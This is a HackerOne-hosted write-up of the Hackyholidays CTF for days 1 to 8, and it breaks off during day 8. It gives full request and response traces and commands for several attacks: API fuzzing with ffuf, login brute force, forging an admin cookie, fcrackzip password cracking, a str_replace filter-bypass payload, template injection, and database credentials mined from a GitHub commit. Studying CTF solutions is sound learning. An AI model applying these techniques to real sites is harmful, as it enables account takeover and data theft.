# Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]

## Report Details
- **Report ID**: 1069396
- **URL**: https://hackerone.com/reports/1069396
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T19:05:52.443Z
- **Disclosed**: 2021-01-14T19:35:13.379Z

## Reporter
- **Username**: kunal94
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Hello Team

#Description 
In the continuous series of 12 days, twelve flags were hidden inside Hackyholidays site - hackyholidays.h1ctf.com in which once we get all the flags, grinch can be stopped. This write-up will describe solving all the 12 days challenges.


#Step To Reproduce

+ It all started when hackerone announced the hackyholidays CTF.

{F1138874}

+ So, every day there will be one CTF added for the next 12 days so that it can end right before Christmas and we have to stop grinch by ruining his plans by getting all the flags and it'll save the holidays.

**Day 1 - CTF level 1**

+ On the first day, CTF level 1 launched. While I was looking into the site, there were no additional functionalities added and no paths, so the first thing which came to my mind before path brute-force and other methods is to always look on /robots.txt file where it can reveal some information.

When I opened https://hackyholidays.h1ctf.com/robots.txt, and thus, in the response, I got the first flag.

{F1138876}

Flag 1 -  ``` flag{48104912-28b0-494a-9995-a203d1e261e7}```



**Day 2 - CTF level 2**

+ In the first day, I've already discovered the path from https://hackyholidays.h1ctf.com/robots.txt. 

```txt
User-agent: *
Disallow: /s3cr3t-ar3a
```

+ So, the path /s3cr3t-ar3a became the second-day challenge, and  I visited the page https://hackyholidays.h1ctf.com/s3cr3t-ar3a,

{F1138880}

+ There was a message on the page which says - page moved. I thought the first thing to look for any hidden paths is to check the page using the Inspect element. While doing the inspect element, I got the second flag. The flag was hidden inside the HTML element.

{F1138892}

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
```

Flag 2 - ```flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}```


**Day 3 - CTF level 3**

+ On the 3rd day, One link has been added and it was https://hackyholidays.h1ctf.com/people-rater inside the` /apps` path.

{F1138895}

+ So, when I visited the page, there was a people-rater application:

{F1138896}

+ As per the logic explained before the start of this challenge - `The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!`

+ So, the hint was hidden in the challenge description which means there is a record or id parameter which needs to be used over here.

+ Intercepting the request on the "load more" was just loading the page using https://hackyholidays.h1ctf.com/people-rater/page/<number> where it was 1,2,3 and 4:

**Request**

```http
GET /people-rater/page/1 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
```

**Response**


``` json
{"results":[{"id":"eyJpZCI6Mn0=","name":"Tea Avery"},{"id":"eyJpZCI6M30=","name":"Mihai Matthews"},{"id":"eyJpZCI6NH0=","name":"Ruth Ward"},{"id":"eyJpZCI6NX0=","name":"Calvin Hogan"},{"id":"eyJpZCI6Nn0=","name":"Reilly Cervantes"}]}
```

+ Looking at the response, the id parameter was base64 encrypted.

+ In the application, I click on the first record "Tea Avery" for rating and intercepted the request:

**Request**

```http
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
```

**Response**


```json
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

+ When I decoded the base 64 id parameter, then the record was starting with the value as 2.     `eyJpZCI6Mn0=   -base64decode -  {"id":2}`. This came to my attention, the rating was starting with id value 2 and so, let's try with value 1 and check what is the record hidden inside the parameter.

+ Encoded the base64 parameter - ```{"id":1}  - eyJpZCI6MX0=``` and again send it to the server on the above request via changing the id parameter above and thus, we got the flag.

**Request**
```http
GET /people-rater/entry?id=eyJpZCI6MX0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
```

**Response**

```json
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

+ Flag 3 - `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`


**Day 4 - CTF level 4**

+ On day 4, inside /apps, there was a new CTF level added as a swag-shop.

+ There was an option to purchase an Item over there and if we click on the link, it'll tell us to log in and it triggers an API request which returns a 401 response.

{F1138963}

**Request**

```http
POST /swag-shop/api/purchase HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 4
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://hackyholidays.h1ctf.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/swag-shop
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

id=3
```

**Response**

```http
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 04:10:41 GMT
Content-Type: application/json
Connection: close
Content-Length: 33

{"error": "You are not logged in"}
```

+ At first, I did the brute force on  https://hackyholidays.h1ctf.com/swag-shop/api/login login area with a different wordlist. But I failed.

{F1138964}

+ As  every request triggered after /api endpoint, so I did the brute force the /api path using the best wordlist which I came across with:

 https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d which was created by Yassine Aboukir. 

+ I used the tool "FFUF" to fuzz the API endpoint with responses such as 200,400,403,401,502.

Command - ```./ffuf -w word.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ" -mc 200,400,403,401,502```

{F1139017}

+ In the response I got:

```
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

+ Afterwards, I visited https://hackyholidays.h1ctf.com/swag-shop/api/sessions :

**Response**

{F1139021}

```json
{
"sessions": [
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
]
}
```

+ I decoded every base64 encrypted session and it turns out on 3rd session was revealing some information:

```
3rd session - 

eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==

base64 decoded - 

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

+ From here, I got user-id as C7DCCE-0E0DAB-B20226-FC92EA-1B9043 and cookie value.

+ Next, I visited https://hackyholidays.h1ctf.com/swag-shop/api/user and response was:

{F1139022}

+ It says "missing required field" and I thought as I got the user id as C7DCCE-0E0DAB-B20226-FC92EA-1B9043, thus we have to add here with some parameter on this API endpoint.

+ I tried with user_id, userid and then I thought as it's encrypted, Let's try with uuid and it worked.

**Request**

https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

**Response**

{F1139023}

```json
{
"uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
"username": "grinch",
"address": {
"line_1": "The Grinch",
"line_2": "The Cave",
"line_3": "Mount Crumpit",
"line_4": "Whoville"
},
"flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

+ In this way, I got the 4th flag in the response.

Flag 4 - ```flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}```


**Day 5 - CTF level 5**

+ On day 5, there was a new link for ctf level which is https://hackyholidays.h1ctf.com/secure-login.

+ To test the login page functionality, I've added some random username such as hello to check the output.

{F1139333}

+ It responded with an invalid username error. As per the logic of the application, if we get the correct username, then the next error definitely will be an "invalid password". So, it was a case of login brute force.

+ I've used Seclist wordlist for usernames. Reference  - https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt

+ To brute force, I've used the OWASP ZAP tool on this request:

```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://hackyholidays.h1ctf.com
Connection: keep-alive
Referer: https://hackyholidays.h1ctf.com/secure-login
Upgrade-Insecure-Requests: 1
Host: hackyholidays.h1ctf.com

username=admin&password=admin
```

{F1139341}

+ However, there was one problem, while brute-forcing on the OWASP ZAP tool, the size, and the response was the same, thus I was checking each request one by one to check the different output. Luckily, on the username as "access",  I got a response as "Invalid Password".

**Request**
```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://hackyholidays.h1ctf.com
Connection: keep-alive
Referer: https://hackyholidays.h1ctf.com/secure-login
Upgrade-Insecure-Requests: 1
Host: hackyholidays.h1ctf.com

username=access&password=admin
```

{F1139359}



{F1139350}

+ In the above screenshot, we can see the response as "Invalid Password".

+ So, the username is "access" and next up to find the valid password.

+ For brute-forcing, I've used another seclist wordlist for a password. Reference - https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-100.txt.

+ Luckily, while brute-forcing the password, I got the response as 302 on the password as "computer".

**Request**

```http
POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://hackyholidays.h1ctf.com
Connection: keep-alive
Referer: https://hackyholidays.h1ctf.com/secure-login
Upgrade-Insecure-Requests: 1
Host: hackyholidays.h1ctf.com

username=access&password=computer
```
{F1139354}

**Response**

```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 10:33:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; expires=Thu, 31-Dec-2020 11:33:46 GMT; Max-Age=3600; path=/secure-login
Location: /secure-login
```


{F1139358}

+ As I got the username as "access" and password as "computer", I've authenticated directly using chrome browser. After logging in, it responded with "no files to download".

{F1139366}

+ First thing I checked to use inspect the element and check if there is a disabled href link or not, however, no luck.
+ Next thing I saw there was a cookie parameter in the response which was base64 encrypted.

`eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`

+ Decoded the base64 parameter and cookie value was `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. I changed the "admin":"false" to "admin":"true" and next thing, again encoded the cookie parameter.

```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true} -> base64 encode -> eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

+ In my chrome browser, I already got the "edit this cookie" extension and I changed with the above newly base64 encoded cookie parameter.

{F1139372}

+ After changing the cookie, I refreshed the page and thus, got the zip file download option as "my_secure_files_not_for_you.zip".

{F1139375}

+ After downloading and when I open the file, it was password protected.

{F1139378}

+ Afterwards, I installed one tool on the mac which is best for cracking the zip file - "Fcrackzip".
http://macappstore.org/fcrackzip/

+ For password wordlist, I got Seclist common 100k passwords - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt.

+ Run the command as `fcrackzip -D -p /Users/kunalpandey/Desktop/pass.txt -u /Users/kunalpandey/Desktop/my_secure_files_not_for_you.zip`

{F1139391}

+ After bruteforcing, I got the result within one second which is "hahahaha" as password. Typed in the password on the zip file, extracted it successfully, and got another flag. There was also a grinch pic along with it.

{F1139393}

+ Inside the flag.txt file, it was stored as `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}` and finally, ctf level 5 was over.

+ Flag 5 - `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`.


**Day 6 - Flag 6**

+ On day 6, the new CTF level was added as `/my-diary` inside `/apps ` path on https://hackyholidays.h1ctf.com.

{F1139404}

+ On visiting the page - https://hackyholidays.h1ctf.com/my-diary/?template=entries.html, it was with template path.

+ If the template path was accepting entries.html, thus it means there must be an index main file to get the output of the main application. So, the first thing I guessed with index.html, however, it redirected to entries.html. So, I was trying as index.jsp, index. aspx, and luckily on index.php, a new page got opened.

**Request**

https://hackyholidays.h1ctf.com/my-diary/?template=index.php

**Response**

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

**Code analysis**

+ While analyzing the above code, it looks like there was a regex check operation, so it means we're only allowed for the range "a-z, A-Z, and 0-9." and thus, no special characters.

+ On the code `$page = str_replace("admin.php","",$page);`, string "admin.php" was replaced with blank character "" .
+ On the code `$page = str_replace("secretadmin.php","",$page);`, string "secretadmin.php" was also replaced with blank character "".
+ In the comment section, the developer has specifically written the comment as "protect admin.php from being read" and then following up "I've changed the admin file to secretadmin.php for more security".
+ Thus, it means we need only the "secretadmin.php" path on the template parameter as "admin.php" was protected.
+ However, as the server was replacing "secretadmin.php" with a blank character, thus it was not fulfilling the condition and redirects to the default page as 
"/my-diary/?template=entries.html".

+ In order to bypass it, it needed a regex bypass condition. In order to bypass the regex condition, I can't apply any special characters, however, I can still use the above string replace condition to bypass the condition which was a blank condition string check.

**Regex Calculation**

```
admin.php = ""                     |   - replaced by blank character
secretadmin.php = ""      | -  replaced by blank character

secretadmin.php   ------->   add blank space ------>secretad''min.php   -------> replace ''with secretadmin.php -------> 
secretadsecretadmin.phpmin.php -------> add blank space --------->   secretadsecretad''min.phpmin.php  ----------> 
replace  '' with admin.php (to complicate more regex check) ----------> secretadsecretadadmin.phpmin.phpmin.php

Final string - secretadsecretadadmin.phpmin.phpmin.php
```

+ In the regex calculation, we are adding blank space in between and thus replacing with admin.php or secretadmin.php so that condition will also be satisfied from the server and also we can bypass the regex check as well.

+ Finally, after complicating the string from `secretadmin.php` to `secretadsecretadadmin.phpmin.phpmin.php`, I've tried again on the template parameter and finally, got the flag.

**Request**

https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadadmin.phpmin.phpmin.php

**Response**

{F1139415}

```
My Diary
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
Pending Entries
Date	Event	Action
23rd Dec	Launch DDoS Against Santa's Workshop!	
```

+ This level was more on the source code analysis rather than the recon part to bypass the regex check from the server.

+ Flag 6 - `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`.

**Day 7 - CTF level 7**

+ On day 7, a new ctf level has been introduced as "hate-mail generator" inside /apps on https://hackyholidays.h1ctf.com.

+ Visiting the workflow of the site gave me an idea about either it's about template injection.

{F1139426}

{F1139425}

{F1139424}

+ Based on the observation, there were three template parameters used in this application.

```
Template param 1 - {{template:cbdj3_grinch_header.html}} - Template parameter which was using the template page to load.
Template param 2- {name} - The name parameter was fetching the name.
Template param 3 - {email} - The email parameter was been used inside the new page on https://hackyholidays.h1ctf.com/hate-mail-generator/new.
```

+ First, I visited the https://hackyholidays.h1ctf.com/hate-mail-generator/new and created a new email as 

{F1139428}

+ For {{template:""}} parameter, I wanted to inject an arbitrary path to check the output first and so decided to give index.html inside the template param.
+ On name area - "hi" ,subject area - "attack" and on Markup area - "Hello {{name}} {{template:index.html}} {{email}}". After selecting the preview option and also intercepting the request:

**Request**

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 172
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

preview_markup=Hello+%7B%7Bname%7D%7D+%7B%7Btemplate%3Aindex.html%7D%7D+%7B%7Bemail%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

**Response**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 11:55:18 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 47

Cannot find template file /templates/index.html
```

+ In the response we got a response as "Cannot find template file /templates/index.html", which means there must be a path "templates" after "hate-mail-generator".

+ Without bruteforcing and checking directly - https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and got the directory preview with html files

**Request**

https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ 

**Response**

{F1139430}

```
Index of /hate-mail-generator/templates/

../
cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
38dhs_admins_only_header.html                                21-Apr-2020 15:29                  46
```

+ So I looked at it and saw this file "38dhs_admins_only_header.html" as it was interesting, however visiting the page directly gave 403 error.

**Request**

https://hackyholidays.h1ctf.com/hate-mail-generator/templates/38dhs_admins_only_header.html

**Response**

{F1139433}

+ I know this was not going to be easy, so the next idea that came to my mind is to directly insert "38dhs_admins_only_header.html " inside the template parameter on the  "preview_markup".

**Request**

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 134
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

preview_markup=Hello{{name}}{{template:38dhs_admins_only_header.html}}{{email}}&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Response**

```http

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 12:23:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 64

You do not have access to the file 38dhs_admins_only_header.html
```

+ I was like hmm, this also failed as it says about access error.

+ So, another method which can be handy in this type of situation will be reference based exploit. In reference based exploit, we can insert the file "38dhs_admins_only_header.html" inside email parameter on preview_data parameter and just call {{email}} on preview_markup directly to check what will be the output and thus, it was exploited successfully.

**Request**

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 106
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

preview_markup={{email}}&preview_data={"name":"aaaa","email":"{{template:38dhs_admins_only_header.html}}"}
```


**Response**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 12:28:45 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 339

<html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

+ So, in this way, reference parameter bypassed the  file condition check due to reference based parameter exploit and got the response from server which there was an hidden flag inside.

Flag 7 - `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`


**Day 8 - CTF level 8**

+ On day 8,  there was new level as https://hackyholidays.h1ctf.com/forum on /apps.

+ Visiting the page directly gave me an idea of the workflow.

{F1139470}
{F1139471}

+ This is an forum area where there are different posts and we need to login to get the access inside.
+ Looking at the posts we can see that there are two users - grinch and max and there is an option to login - 

https://hackyholidays.h1ctf.com/forum/login.

{F1139475}

+ So, first thing I tried to bruteforce passwords area with both username as grinch and max but no luck at all on login area. I was trying to analyze more and more and inspect the element but couldn't find anything.

+ I know the CTF master is "adamtlangley". So, I tried to search his github repo to see if I find anything as intentionally or unintentionally there can be source code leakage, at this point it was all guess.

+ Thus, I search it on google as "site:github.com adamtlangley" and got the link as "https://github.com/adamtlangley".

{F1139482}

+ In the contribution activity, I saw 

```
December 2020
Grinch-Networks/forum 1 commit
```

+ So, I visited the page https://github.com/Grinch-Networks/forum and started the code review one by one on every files. I wanted to see if there are an username and password leaked or not.

+ Analyzed every files, however couln't find anything interesting. Next up, I started to look at commits area - "https://github.com/Grinch-Networks/forum/commits/main", and thus on the second commit as "small fix", it was leaking the username and password for the database.

**Request**
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

**Response**

```php

 */
    static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$read = new DbConnect( false, '', '','' );
        }
        return self::$read;
    }
@@ -146,7 +146,7 @@ public static function closeAll(){
     */
    static public function write(){
        if( gettype(self::$write) == 'string' ) {
            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$write = new DbConnect( true,  '', '','' );
        }
        return self::$write;
    }
```

